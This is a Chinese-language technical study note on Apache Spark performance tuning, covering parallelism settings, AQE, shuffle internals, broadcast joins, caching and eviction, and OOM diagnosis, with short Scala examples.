<h2 id="spark"><a href="#spark" class="headerlink" title="spark"></a>spark</h2><h3 id="配置项的分类"><a href="#配置项的分类" class="headerlink" title="配置项的分类"></a>配置项的分类</h3><p>在 Spark 分布式计算环境中，计算负载主要由 Executors 承担，Driver 主要负责分布式调度，调优空间有限，因此对 Driver 端的配置项我们不作考虑，我们要汇总的配置项都围绕 Executors 展开。那么，结合过往的实践经验，以及对官网全量配置项的梳理，我把它们划分为 3 类，分别是硬件资源类、Shuffle 类和 Spark SQL 大类。</p>
<ul>
<li>首先，硬件资源类包含的是与 CPU、内存、磁盘有关的配置项</li>
<li>其次，Shuffle 类是专门针对 Shuffle 操作的</li>
<li>最后，Spark SQL 早已演化为新一代的底层优化引擎</li>
</ul>
<p><img src="https://static001.geekbang.org/resource/image/31/6a/31356505a2c36bac10de0e06d7e4526a.jpg"></p>
<h3 id="spark-sql-shuffle-partitions"><a href="#spark-sql-shuffle-partitions" class="headerlink" title="spark.sql.shuffle.partitions"></a>spark.sql.shuffle.partitions</h3><p>spark.sql.shuffle.partitions: 设置的是 RDD1做shuffle处理后生成的结果RDD2的分区数.默认值: 200</p>
<p>spark.default.parallelism: 设置的是 RDD1做shuffle处理/并行处理(窄依赖算子)后生成的结果RDD2的分区数默认值:</p>
<p>为了充分利用划拨给 Spark 集群的每一颗 CPU，准确地说是每一个 CPU 核（CPU Core），你需要设置与之匹配的并行度，并行度用 spark.default.parallelism 和 spark.sql.shuffle.partitions 这两个参数设置。对于没有明确分区规则的 RDD 来说，我们用 spark.default.parallelism 定义其并行度，spark.sql.shuffle.partitions 则用于明确指定数据关联或聚合操作中 Reduce 端的分区数量。</p>
<h3 id="spark并行度"><a href="#spark并行度" class="headerlink" title="spark并行度"></a>spark并行度</h3><p>并行度其实就是指的是spark作业中, 各个stage的taskset中的task的数量, 代表了spark作业中各个阶段的并行度, 而taskset中的task数量 = task任务的父RDD中分区数。</p>
<p>官网建议: 设置为当前spark job的总core数量的2~3倍。</p>
<h3 id="spark-sql-files-maxPartitionBytes"><a href="#spark-sql-files-maxPartitionBytes" class="headerlink" title="spark.sql.files.maxPartitionBytes"></a>spark.sql.files.maxPartitionBytes</h3><p>The maximum number of bytes to pack into a single partition when reading files. This configuration is effective only when using file-based sources such as Parquet, JSON and ORC.</p>
<h3 id="spark-sql-files-minPartitionNum"><a href="#spark-sql-files-minPartitionNum" class="headerlink" title="spark.sql.files.minPartitionNum"></a>spark.sql.files.minPartitionNum</h3><p>The suggested (not guaranteed) minimum number of split file partitions. If not set, the default value is <code>spark.default.parallelism</code>. This configuration is effective only when using file-based sources such as Parquet, JSON and ORC.</p>
<h3 id="AQE"><a href="#AQE" class="headerlink" title="AQE"></a>AQE</h3><h4 id="自动分区合"><a href="#自动分区合" class="headerlink" title="自动分区合"></a>自动分区合</h4><p><img src="https://static001.geekbang.org/resource/image/da/4f/dae9dc8b90c2d5e0cf77180ac056a94f.jpg"></p>
<p>我们一起来看一下 AQE 分区合并的工作原理。如上图所示，对于所有的数据分区，无论大小，AQE 按照分区编号从左到右进行扫描，边扫描边记录分区尺寸，当相邻分区的尺寸之和大于“目标尺寸”时，AQE 就把这些扫描过的分区进行合并。然后，继续向右扫描，并采用同样的算法，按照目标尺寸合并剩余分区，直到所有分区都处理完毕。</p>
<p>总的来说就是，AQE 事先并不判断哪些分区足够小，而是按照分区编号进行扫描，当扫描量超过“目标尺寸”时，就合并一次。我们发现，这个过程中的关键就是“目标尺寸”的确定，它的大小决定了合并之后分布式数据集的分散程度。</p>
<h4 id="自动数据倾斜处理"><a href="#自动数据倾斜处理" class="headerlink" title="自动数据倾斜处理"></a>自动数据倾斜处理</h4><p>首先，分区尺寸必须要大于 spark.sql.adaptive.skewJoin.skewedPartitionThresholdInBytes 参数的设定值，才有可能被判定为倾斜分区。然后，AQE 统计所有数据分区大小并排序，取中位数作为放大基数，尺寸大于中位数一定倍数的分区会被判定为倾斜分区，中位数的放大倍数也是由参数 spark.sql.adaptive.skewJoin.skewedPartitionFactor 控制。</p>
<p>检测到倾斜分区之后，接下来就是对它拆分，拆分的时候还会用到 advisoryPartitionSizeInBytes 参数。</p>
<h4 id="Join-策略调整"><a href="#Join-策略调整" class="headerlink" title="Join 策略调整"></a>Join 策略调整</h4><p>AQE 很好地解决了这两个头疼的问题。首先，AQE 的 Join 策略调整是一种动态优化机制，对于刚才的两张大表，AQE 会在数据表完成过滤操作之后动态计算剩余数据量，当数据量满足广播条件时，AQE 会重新调整逻辑执行计划，在新的逻辑计划中把 Shuffle Joins 降级为 Broadcast Join。再者，运行时的数据量估算要比编译时准确得多，因此 AQE 的动态 Join 策略调整相比静态优化会更可靠、更稳定。</p>
<h3 id="什么是shuffle"><a href="#什么是shuffle" class="headerlink" title="什么是shuffle"></a>什么是shuffle</h3><p>Shuffle 的计算过程分为 Map 和 Reduce 这两个阶段。其中，Map 阶段执行映射逻辑，并按照 Reducer 的分区规则，将中间数据写入到本地磁盘；Reduce 阶段从各个节点下载数据分片，并根据需要实现聚合计算。</p>
<h3 id="为什么reduceByKey优于groupByKey"><a href="#为什么reduceByKey优于groupByKey" class="headerlink" title="为什么reduceByKey优于groupByKey"></a>为什么reduceByKey优于groupByKey</h3><p>之前我们也说过，Map 阶段最终生产的数据会以中间文件的形式物化到磁盘中，这些中间文件就存储在 spark.local.dir 设置的文件目录里。中间文件包含两种类型：一类是后缀为 data 的数据文件，存储的内容是 Map 阶段生产的待分发数据；另一类是后缀为 index 的索引文件，它记录的是数据文件中不同分区的偏移地址。这里的分区是指 Reduce 阶段的分区，因此，分区数量与 Reduce 阶段的并行度保持一致。</p>
<p>这样一来，我们就可以把问题进一步聚焦在，Spark 在 Map 阶段是如何生产这些中间文件的。不过，我们首先需要明确的是，Map 阶段每一个 Task 的执行流程都是一样的，每个 Task 最终都会生成一个数据文件和一个索引文件。因此，中间文件的数量与 Map 阶段的并行度保持一致。换句话说，有多少个 Task，Map 阶段就会生产相应数量的数据文件和索引文件。</p>
<h4 id="groupByKey"><a href="#groupByKey" class="headerlink" title="groupByKey"></a>groupByKey</h4><p>groupByKey 是 pairRDD 算子，需要消费（Key，Value）形式的数据，因此我们需要对原始花朵数据做一次转换。</p>
<p>目标分区计算好之后，Map Task 会把每条数据记录和它的目标分区，放到一个特殊的数据结构里，这个数据结构叫做“PartitionedPairBuffer”，它本质上就是一种数组形式的缓存结构。</p>
<p>每条数据记录都会占用数组中相邻的两个元素空间，第一个元素是（目标分区，Key），第二个元素是 Value。假设 PartitionedPairBuffer 的大小是 4，也就是最多只能存储 4 条数据记录。那么，如果我们还以数据分区 0 为例，前 四条数据在 PartitionedPairBuffer 中的存储状态就会如下所示。</p>
<p><img src="https://static001.geekbang.org/resource/image/36/28/36fd9b5318e82bf1a3264fb558c0e128.jpg"></p>
<p>对我们来说，最理想的情况当然是 PartitionedPairBuffer 足够大，大到足以容纳 Map Task 所需处理的所有数据。不过，现实总是很骨感，每个 Task 分到的内存空间是有限的，PartitionedPairBuffer 自然也不能保证能容纳分区中的所有数据。因此，Spark 需要一种计算机制，来保障在数据总量超出可用内存的情况下，依然能够完成计算。这种机制就是：排序、溢出、归并。</p>
<p>不过，在溢出之前，对于 PartitionedPairBuffer 中已有的数据，Map Task 会先按照数据记录的第一个元素，也就是目标分区 + Key 进行排序。也就是说，尽管数据暂时溢出到了磁盘，但是临时文件中的数据也是有序的。</p>
<p><img src="https://static001.geekbang.org/resource/image/47/9a/4778e6e7ba922b101936a4c983b3ed9a.jpg"></p>
<ol>
<li>对于分片中的数据记录，逐一计算其目标分区，并将其填充到 PartitionedPairBuffer；</li>
<li>PartitionedPairBuffer 填满后，如果分片中还有未处理的数据记录，就对 Buffer 中的数据记录按（目标分区 ID，Key）进行排序，将所有数据溢出到临时文件，同时清空缓存；</li>
<li>重复步骤 1、2，直到分片中所有的数据记录都被处理；</li>
<li>对所有临时文件和 PartitionedPairBuffer 归并排序，最终生成数据文件和索引文件。</li>
</ol>
<h4 id="reduceByKey"><a href="#reduceByKey" class="headerlink" title="reduceByKey"></a>reduceByKey</h4><p>区别在于，在计算的过程中，reduceByKey 采用一种叫做 PartitionedAppendOnlyMap 的数据结构来填充数据记录。这个数据结构是一种 Map，而 Map 的 Value 值是可累加、可更新的。因此，PartitionedAppendOnlyMap 非常适合聚合类的计算场景，如计数、求和、均值计算、极值计算等等。</p>
<p><img src="https://static001.geekbang.org/resource/image/a3/a4/a3e397dd3ce348f10eae76f809f37ca4.jpg"></p>
<p>在 PartitionedAppendOnlyMap 中，由于 Value 是可累加、可更新的，因此这种数据结构可以容纳的花朵数量一定比 4 大。因此，相比 PartitionedPairBuffer，PartitionedAppendOnlyMap 的存储效率要高得多，溢出数据到磁盘文件的频率也要低得多。</p>
<p>以此类推，最终合并的数据文件也会小很多。依靠高效的内存数据结构、更少的磁盘文件、更小的文件尺寸，我们就能大幅降低了 Shuffle 过程中的磁盘和网络开销。</p>
<p>事实上，相比 groupByKey、collect_list 这些收集类算子，聚合类算子（reduceByKey、aggregateByKey 等）在执行性能上更占优势。因此，我们要避免在聚合类的计算需求中，引入收集类的算子。虽然这种做法不妨碍业务逻辑实现，但在性能调优上可以说是大忌。</p>
<p>比groupByKey生产的中间文件size小，因为做过map端的预聚合，所以节省了空间，也节省了时间开销。</p>
<h3 id="广播变量如何克制shuffle"><a href="#广播变量如何克制shuffle" class="headerlink" title="广播变量如何克制shuffle"></a>广播变量如何克制shuffle</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>不实用广播变量</p>
<p><img src="https://static001.geekbang.org/resource/image/ba/39/ba45d47a910ccb92861b1fd153b36839.jpg"></p>
<p>使用广播变量</p>
<p><img src="https://static001.geekbang.org/resource/image/2c/f7/2cfe084a106a01bf14a63466fa2146f7.jpg"></p>
<p><img src="https://static001.geekbang.org/resource/image/8a/6c/8ac91a174803b97966289ff51938106c.jpg"></p>
<p>与普通变量相比，分布式数据集的数据源不在 Driver 端，而是来自所有的 Executors。Executors 中的每个分布式任务负责生产全量数据集的一部分，也就是图中不同的数据分区。因此，步骤 1 就是 Driver 从所有的 Executors 拉取这些数据分区，然后在本地构建全量数据。步骤 2 与从普通变量创建广播变量的过程类似。 Driver 把汇总好的全量数据分发给各个 Executors，Executors 将接收到的全量数据缓存到存储系统的 BlockManager 中。</p>
<p>不难发现，相比从普通变量创建广播变量，从分布式数据集创建广播变量的网络开销更大。原因主要有二：一是，前者比后者多了一步网络通信；二是，前者的数据体量通常比后者大很多。</p>
<h4 id="Driver-可能会成为瓶颈"><a href="#Driver-可能会成为瓶颈" class="headerlink" title="Driver 可能会成为瓶颈"></a>Driver 可能会成为瓶颈</h4><p>改成由driver获取到数据分布，然后通知各个executor之间进行拉取，这样可以利用多个executor网络，避免只有driver组装以后再一个一个发送效率过低</p>
<h4 id="运用广播变量"><a href="#运用广播变量" class="headerlink" title="运用广播变量"></a>运用广播变量</h4><p>spark.sql.autoBroadcastJoinThreshold 这个配置项。它的设置值是存储大小，默认是 10MB。它的含义是，对于参与 Join 的两张表来说，任意一张表的尺寸小于 10MB，Spark 就在运行时采用 Broadcast Joins 的实现方式去做数据关联。另外，AQE 在运行时尝试动态调整 Join 策略时，也是基于这个参数来判定过滤后的数据表是否足够小，从而把原本的 Shuffle Joins 调整为 Broadcast Joins。</p>
<p><img src="https://static001.geekbang.org/resource/image/69/89/697cccb272fc8863f40bb7c465f53c89.jpeg"></p>
<h4 id="预估一张表在内存中的存储大小"><a href="#预估一张表在内存中的存储大小" class="headerlink" title="预估一张表在内存中的存储大小"></a>预估一张表在内存中的存储大小</h4><p>首先，我们要避开一个坑。我发现，有很多资料推荐用 Spark 内置的 SizeEstimator 去预估分布式数据集的存储大小。结合多次实战和踩坑经验，咱们必须要指出，SizeEstimator 的估算结果不准确。因此，你可以直接跳过这种方法，这也能节省你调优的时间和精力。</p>
<p>第一步，把要预估大小的数据表缓存到内存，比如直接在 DataFrame 或是 Dataset 上调用 cache 方法；第二步，读取 Spark SQL 执行计划的统计数据。这是因为，Spark SQL 在运行时，就是靠这些统计数据来制定和调整执行策略的。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">sval df: <span class="type">DataFrame</span> = _</span><br><span class="line">df.cache.count</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> plan = df.queryExecution.logical</span><br><span class="line"><span class="keyword">val</span> estimated: <span class="type">BigInt</span> = spark</span><br><span class="line">.sessionState</span><br><span class="line">.executePlan(plan)</span><br><span class="line">.optimizedPlan</span><br><span class="line">.stats</span><br><span class="line">.sizeInBytes</span><br></pre></td></tr></table></figure>

<h4 id="用-Join-Hints-强制广播"><a href="#用-Join-Hints-强制广播" class="headerlink" title="用 Join Hints 强制广播"></a>用 Join Hints 强制广播</h4><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> table1: <span class="type">DataFrame</span> = spark.read.parquet(path1)</span><br><span class="line"><span class="keyword">val</span> table2: <span class="type">DataFrame</span> = spark.read.parquet(path2)</span><br><span class="line">table1.createOrReplaceTempView(<span class="string">&quot;t1&quot;</span>)</span><br><span class="line">table2.createOrReplaceTempView(<span class="string">&quot;t2&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">val</span> query: <span class="type">String</span> = “select <span class="comment">/*+ broadcast(t2) */</span> * from t1 inner join t2 on t1.key = t2.key”</span><br><span class="line"><span class="keyword">val</span> queryResutls: <span class="type">DataFrame</span> = spark.sql(query)</span><br></pre></td></tr></table></figure>

<h4 id="用-broadcast-函数强制广播"><a href="#用-broadcast-函数强制广播" class="headerlink" title="用 broadcast 函数强制广播"></a>用 broadcast 函数强制广播</h4><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.spark.sql.functions.broadcast</span><br><span class="line">table1.join(broadcast(table2), <span class="type">Seq</span>(“key”), “inner”)</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>我认为，以广播阈值配置为主，以强制广播为辅，往往是不错的选择。</p>
<p>广播阈值的设置，更多的是把选择权交给 Spark SQL，尤其是在 AQE 的机制下，动态 Join 策略调整需要这样的设置在运行时做出选择。强制广播更多的是开发者以专家经验去指导 Spark SQL 该如何选择运行时策略。二者相辅相成，并不冲突，开发者灵活地运用就能平衡 Spark SQL 优化策略与专家经验在应用中的比例。</p>
<p>首先，从性能上来讲，Driver 在创建广播变量的过程中，需要拉取分布式数据集所有的数据分片。在这个过程中，网络开销和 Driver 内存会成为性能隐患。广播变量尺寸越大，额外引入的性能开销就会越多。更何况，如果广播变量大小超过 8GB，Spark 会直接抛异常中断任务执行。</p>
<p>其次，从功能上来讲，并不是所有的 Joins 类型都可以转换为 Broadcast Joins。一来，Broadcast Joins 不支持全连接（Full Outer Joins）；二来，在所有的数据关联中，我们不能广播基表。或者说，即便开发者强制广播基表，也无济于事。比如说，在左连接（Left Outer Join）中，我们只能广播右表；在右连接（Right Outer Join）中，我们只能广播左表。在下面的代码中，即便我们强制用 broadcast 函数进行广播，Spark SQL 在运行时还是会选择 Shuffle Joins。</p>
<h3 id="并行度、并发度与执行内存"><a href="#并行度、并发度与执行内存" class="headerlink" title="并行度、并发度与执行内存"></a>并行度、并发度与执行内存</h3><h4 id="并行度"><a href="#并行度" class="headerlink" title="并行度"></a>并行度</h4><p>并行度指的是为了实现分布式计算，分布式数据集被划分出来的份数。并行度明确了数据划分的粒度：并行度越高，数据的粒度越细，数据分片越多，数据越分散。</p>
<p>并行度可以通过两个参数来设置，分别是 spark.default.parallelism 和 spark.sql.shuffle.partitions。前者用于设置 RDD 的默认并行度，后者在 Spark SQL 开发框架下，指定了 Shuffle Reduce 阶段默认的并行度。</p>
<h4 id="并发度"><a href="#并发度" class="headerlink" title="并发度"></a>并发度</h4><p>Executor 的线程池大小由参数 spark.executor.cores 决定，每个任务在执行期间需要消耗的线程数由 spark.task.cpus 配置项给定。两者相除得到的商就是并发度，也就是同一时间内，一个 Executor 内部可以同时运行的最大任务数量。又因为，spark.task.cpus 默认数值为 1，并且通常不需要调整，所以，并发度基本由 spark.executor.cores 参数敲定。</p>
<p>就 Executor 的线程池来说，尽管线程本身可以复用，但每个线程在同一时间只能计算一个任务，每个任务负责处理一个数据分片。因此，在运行时，线程、任务与分区是一一对应的关系。</p>
<h4 id="CPU-低效原因之一：线程挂起"><a href="#CPU-低效原因之一：线程挂起" class="headerlink" title="CPU 低效原因之一：线程挂起"></a>CPU 低效原因之一：线程挂起</h4><p>在给定执行内存总量 M 和线程总数 N 的情况下，为了保证每个线程都有机会拿到适量的内存去处理数据，Spark 用 HashMap 数据结构，以（Key，Value）的方式来记录每个线程消耗的内存大小，并确保所有的 Value 值都不超过 M/N。在一些极端情况下，有些线程申请不到所需的内存空间，能拿到的内存合计还不到 M/N/2。这个时候，Spark 就会把线程挂起，直到其他线程释放了足够的内存空间为止。</p>
<p>我们之前把每个 Task 需要处理的数据分片比作是作物种子，那么，数据分片的数据量决定了执行任务需要申请多少内存。如果分布式数据集的并行度设置得当，因任务调度滞后而导致的线程挂起问题就会得到缓解。</p>
<h4 id="CPU-低效原因之二：调度开销"><a href="#CPU-低效原因之二：调度开销" class="headerlink" title="CPU 低效原因之二：调度开销"></a>CPU 低效原因之二：调度开销</h4><p>当然不是，并行度足够大，确实会让数据分片更分散、数据粒度更细，因此，每个执行任务所需消耗的内存更少。但是，数据过于分散会带来严重的副作用：调度开销骤增。</p>
<p>对于每一个分布式任务，Dirver 会将其封装为 TaskDescription，然后分发给各个 Executor。TaskDescription 包含着与任务运行有关的所有信息，如任务 ID、尝试 ID、要处理的数据分片 ID、开发者添加的本地文件和 Jar 包、任务属性、序列化的任务代码等等。Executor 接收到 TaskDescription 之后，首先需要对 TaskDescription 反序列化才能读取任务信息，然后将任务代码再反序列化得到可执行代码，最后再结合其他任务信息创建 TaskRunner。</p>
<p>因此你看，每个任务的调度与执行都需要 Executor 消耗 CPU 去执行上述一系列的操作步骤。数据分片与线程、执行任务一一对应，当数据过于分散，分布式任务数量会大幅增加，但每个任务需要处理的数据量却少之又少，就 CPU 消耗来说，相比花在数据处理上的比例，任务调度上的开销几乎与之分庭抗礼。显然，在这种情况下，CPU 的有效利用率也是极低的。</p>
<h4 id="如何优化-CPU-利用率"><a href="#如何优化-CPU-利用率" class="headerlink" title="如何优化 CPU 利用率"></a>如何优化 CPU 利用率</h4><p>因此，在给定 Executor 线程池和执行内存大小的时候，我们可以参考上面的算法，去计算一个能够让数据分片平均大小在（M/N/2, M/N）之间的并行度，这往往是个不错的选择。</p>
<p><img src="https://static001.geekbang.org/resource/image/4a/ce/4a5dc54813346924ec5611f6d1fa8fce.jpg?wh=4101*1043"></p>
<h3 id="存储空间视角"><a href="#存储空间视角" class="headerlink" title="存储空间视角"></a>存储空间视角</h3><h4 id="缓存RDD的过程"><a href="#缓存RDD的过程" class="headerlink" title="缓存RDD的过程"></a>缓存RDD的过程</h4><p><img src="https://static001.geekbang.org/resource/image/1y/0b/1yy5fd9f111f4cab0edc7cf582bd2b0b.jpg"></p>
<ul>
<li>第一步就是通过调用 putIteratorAsValues 或是 putIteratorAsBytes 方法，把 RDD 迭代器展开为数据值，然后把这些数据值暂存到一个叫做 ValuesHolder 的数据结构里。这一步，我们通常把它叫做“Unroll”。</li>
<li>第二步，为了节省内存开销，我们可以在存储数据值的 ValuesHolder 上直接调用 toArray 或是 toByteBuffer 操作，把 ValuesHolder 转换为 MemoryEntry 数据结构。</li>
<li>第三步，这些包含 RDD 数据值的 MemoryEntry 和与之对应的 BlockId，会被一起存入 Key 为 BlockId、Value 是 MemoryEntry 引用的链式哈希字典中。因此，LinkedHashMap[BlockId, MemoryEntry]缓存的是关于数据存储的元数据，MemoryEntry 才是真正保存 RDD 数据实体的存储单元。换句话说，大面积占用内存的不是哈希字典，而是一个又一个的 MemoryEntry。</li>
</ul>
<h4 id="透过-Shuffle-看-DiskStore"><a href="#透过-Shuffle-看-DiskStore" class="headerlink" title="透过 Shuffle 看 DiskStore"></a>透过 Shuffle 看 DiskStore</h4><p>DiskStore 中数据的存取本质上就是字节序列与磁盘文件之间的转换，它通过 putBytes 方法把字节序列存入磁盘文件，再通过 getBytes 方法将文件内容转换为数据块。</p>
<p><img src="https://static001.geekbang.org/resource/image/1e/4f/1eccayy6d9b7348ceea3cf3b12913a4f.jpg"></p>
<p>DiskStore 这个狡猾的家伙并没有亲自维护这些元数据，而是请了 DiskBlockManager 这个给力的帮手。</p>
<p>DiskBlockManager 的主要职责就是，记录逻辑数据块 Block 与磁盘文件系统中物理文件的对应关系，每个 Block 都对应一个磁盘文件。</p>
<h4 id="如何有效避免Cache滥用"><a href="#如何有效避免Cache滥用" class="headerlink" title="如何有效避免Cache滥用"></a>如何有效避免Cache滥用</h4><h5 id="存储级别"><a href="#存储级别" class="headerlink" title="存储级别"></a>存储级别</h5><p>每一种存储级别都包含 3 个基本要素。</p>
<ul>
<li>存储介质：内存还是磁盘，或是两者都有。</li>
<li>存储形式：对象值还是序列化的字节数组，带 SER 字样的表示以序列化方式存储，不带 SER 则表示采用对象值。</li>
<li>副本数量：存储级别名字最后的数字代表拷贝数量，没有数字默认为 1 份副本。</li>
</ul>
<p><img src="https://static001.geekbang.org/resource/image/4e/e2/4ecdfd4b62b1c6e151d029c38088yye2.jpeg"></p>
<h5 id="缓存的销毁过程"><a href="#缓存的销毁过程" class="headerlink" title="缓存的销毁过程"></a>缓存的销毁过程</h5><p><img src="https://static001.geekbang.org/resource/image/b7/14/b73308328ef549579d02c72afb2ab114.jpg"></p>
<p>我们用一张图来演示这个过程，假设 MemoryStore 中存有 4 个 RDD/Data Frame 的缓存数据，这 4 个分布式数据集各自缓存了一些数据分片之后，Storage Memory 区域就被占满了。当 RDD1 尝试把第 6 个分片缓存到 MemoryStore 时，却发现内存不足，塞不进去了。</p>
<p>这种情况下，Spark 就会逐一清除一些“尸位素餐”的 MemoryEntry 来释放内存，从而获取更多的可用空间来存储新的数据分片。这个过程叫做 Eviction，它的中文翻译还是蛮形象的，就叫做驱逐，也就是把 MemoryStore 中那些倒霉的 MemoryEntry 驱逐出内存。</p>
<p>在清除缓存的过程中，Spark 遵循两个基本原则：</p>
<ul>
<li>LRU：按照元素的访问顺序，优先清除那些“最近最少访问”的 BlockId、MemoryEntry 键值对</li>
<li>兔子不吃窝边草：在清除的过程中，同属一个 RDD 的 MemoryEntry 拥有“赦免权”</li>
</ul>
<p><strong>Spark 使用了一个巧妙的数据结构：LinkedHashMap，这种数据结构天然地支持 LRU 算法</strong></p>
<h4 id="定位OOM"><a href="#定位OOM" class="headerlink" title="定位OOM"></a>定位OOM</h4><h5 id="Driver-端的-OOM"><a href="#Driver-端的-OOM" class="headerlink" title="Driver 端的 OOM"></a>Driver 端的 OOM</h5><p>因此 Driver 端的 OOM 逃不出 2 类病灶：</p>
<ul>
<li>创建的数据集超过内存上限</li>
<li>收集的结果集超过内存上限</li>
</ul>
<p>比较难定位的是间接调用 collect 而导致的 OOM。那么，间接调用 collect 是指什么呢？还记得广播变量的工作原理吗？广播变量在创建的过程中，需要先把分布在所有 Executors 的数据分片拉取到 Driver 端，然后在 Driver 端构建广播变量，最后 Driver 端把封装好的广播变量再分发给各个 Executors。第一步的数据拉取其实就是用 collect 实现的。如果 Executors 中数据分片的总大小超过 Driver 端内存上限也会报 OOM。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.OutOfMemoryError: Not enough memory to build and broadcast</span><br></pre></td></tr></table></figure>

<h5 id="Executor-端的-OOM"><a href="#Executor-端的-OOM" class="headerlink" title="Executor 端的 OOM"></a>Executor 端的 OOM</h5><p>在 Executors 中，与任务执行有关的内存区域才存在 OOM 的隐患。其中，Reserved Memory 大小固定为 300MB，因为它是硬编码到源码中的，所以不受用户控制。而对于 Storage Memory 来说，即便数据集不能完全缓存到 MemoryStore，Spark 也不会抛 OOM 异常，额外的数据要么落盘（MEMORY_AND_DISK）、要么直接放弃（MEMORY_ONLY）。</p>
<h5 id="Execution-Memory-的-OOM"><a href="#Execution-Memory-的-OOM" class="headerlink" title="Execution Memory 的 OOM"></a>Execution Memory 的 OOM</h5><p>一旦分布式任务的内存请求超出 1/N 这个上限，Execution Memory 就会出现 OOM 问题。</p>
<h4 id="磁盘在功能上的作用"><a href="#磁盘在功能上的作用" class="headerlink" title="磁盘在功能上的作用"></a>磁盘在功能上的作用</h4><ul>
<li>磁盘在功能上的第一个作用：溢出临时文件</li>
<li>磁盘的在功能上的第二个作用：存储 Shuffle 中间文件。</li>
<li>磁盘的第三个作用就是缓存分布式数据集。也就是说，凡是带DISK字样的存储模式，都会把内存中放不下的数据缓存到磁盘。</li>
</ul>
<h5 id="性能上的价值"><a href="#性能上的价值" class="headerlink" title="性能上的价值"></a>性能上的价值</h5><p>磁盘复用，它指的是 Shuffle Write 阶段产生的中间文件被多次计算重复利用的过程。磁盘复用的收益之一就是缩短失败重试的路径，在保障作业稳定性的同时提升执行性能。</p>
<p><img src="https://static001.geekbang.org/resource/image/35/86/35c13d9f2eba5d23dabe05249ccb9486.jpg"></p>
<h5 id="ReuseExchange-机制下的磁盘复用"><a href="#ReuseExchange-机制下的磁盘复用" class="headerlink" title="ReuseExchange 机制下的磁盘复用"></a>ReuseExchange 机制下的磁盘复用</h5><p>ReuseExchange 是 Spark SQL 众多优化策略中的一种，它指的是相同或是相似的物理计划可以共享 Shuffle 计算的中间结果，也就是我们常说的 Shuffle 中间文件。ReuseExchange 机制可以帮我们削减 I/O 开销，甚至节省 Shuffle，来大幅提升执行性能。</p>
<p>事实上，触发条件至少有 2 个：</p>
<ul>
<li>多个查询所依赖的分区规则要与 Shuffle 中间数据的分区规则保持一致</li>
<li>多个查询所涉及的字段（Attributes）要保持一致</li>
</ul>
<p>优化前</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">//版本1：分别计算PV、UV，然后合并</span></span><br><span class="line"><span class="comment">// Data schema (userId: String, accessTime: Timestamp, page: String)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">val</span> filePath: <span class="type">String</span> = _</span><br><span class="line"><span class="keyword">val</span> df: <span class="type">DataFrame</span> = spark.read.parquet(filePath)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">val</span> dfPV: <span class="type">DataFrame</span> = df.groupBy(<span class="string">&quot;userId&quot;</span>).agg(count(<span class="string">&quot;page&quot;</span>).alias(<span class="string">&quot;value&quot;</span>)).withColumn(<span class="string">&quot;metrics&quot;</span>, lit(<span class="string">&quot;PV&quot;</span>))</span><br><span class="line"><span class="keyword">val</span> dfUV: <span class="type">DataFrame</span> = df.groupBy(<span class="string">&quot;userId&quot;</span>).agg(countDistinct(<span class="string">&quot;page&quot;</span>).alias(<span class="string">&quot;value&quot;</span>)).withColumn(<span class="string">&quot;metrics &quot;</span>, lit(<span class="string">&quot;UV&quot;</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">val</span> resultDF: <span class="type">DataFrame</span> = dfPV.<span class="type">Union</span>(dfUV)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Result样例</span></span><br><span class="line">| userId | metrics | value |</span><br><span class="line">| user0  | <span class="type">PV</span>      | <span class="number">25</span> |</span><br><span class="line">| user0  | <span class="type">UV</span>      | <span class="number">12</span> |</span><br></pre></td></tr></table></figure>

<p><img src="https://static001.geekbang.org/resource/image/dd/28/dd150e0863812522a6f2ee9102678928.jpg"></p>
<p>优化后</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">//版本2：分别计算PV、UV，然后合并</span></span><br><span class="line"><span class="comment">// Data schema (userId: String, accessTime: Timestamp, page: String)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">val</span> filePath: <span class="type">String</span> = _</span><br><span class="line"><span class="keyword">val</span> df: <span class="type">DataFrame</span> = spark.read.parquet(filePath).repartition($<span class="string">&quot;userId&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">val</span> dfPV: <span class="type">DataFrame</span> = df.groupBy(<span class="string">&quot;userId&quot;</span>).agg(count(<span class="string">&quot;page&quot;</span>).alias(<span class="string">&quot;value&quot;</span>)).withColumn(<span class="string">&quot;metrics&quot;</span>, lit(<span class="string">&quot;PV&quot;</span>))</span><br><span class="line"><span class="keyword">val</span> dfUV: <span class="type">DataFrame</span> = df.groupBy(<span class="string">&quot;userId&quot;</span>).agg(countDistinct(<span class="string">&quot;page&quot;</span>).alias(<span class="string">&quot;value&quot;</span>)).withColumn(<span class="string">&quot;metrics &quot;</span>, lit(<span class="string">&quot;UV&quot;</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">val</span> resultDF: <span class="type">DataFrame</span> = dfPV.<span class="type">Union</span>(dfUV)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Result样例</span></span><br><span class="line">| userId | metrics | value |</span><br><span class="line">| user0  | <span class="type">PV</span>      | <span class="number">25</span> |</span><br><span class="line">| user0  | <span class="type">UV</span>      | <span class="number">12</span> |</span><br></pre></td></tr></table></figure>

<p><img src="https://static001.geekbang.org/resource/image/00/b2/008e691de73eefc6daa4886017fa33b2.jpg"></p>
<h4 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h4><p>在 Spark 中，有两种序列化器供开发者选择，分别是 Java serializer 和 Kryo Serializer。Spark 官方和网上的技术博客都会推荐你使用 Kryo Serializer 来提高效率。</p>
